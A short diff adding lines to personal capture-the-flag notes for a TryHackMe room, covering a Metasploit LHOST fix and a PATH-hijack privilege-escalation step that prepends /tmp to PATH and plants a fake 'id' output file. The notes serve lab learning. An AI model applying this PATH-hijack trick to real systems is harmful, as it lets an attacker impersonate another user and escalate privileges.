@@ -632,3 +632,14 @@ You have a TryHackMe VPN connection. Your VPN IP is 192.168.145.103 (on tun0). U
 Fix:
 In Metasploit, set the LHOST to your VPN IP:    set LHOST 192.168.145.103
 followed walkthrough
+
+how to add /tmp to our path
+export PATH=$PATH:/tmp
+To verify it was added:
+echo $PATH
+Quick one-liner to add and verify:
+export PATH=$PATH:/tmp && echo $PATH
+
+create /tmp/id with uid=33 etc content
+echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)" > /tmp/id
+*supposed to be echo "uid=33(think) gid=33(think) groups=33(think)" > /tmp/id
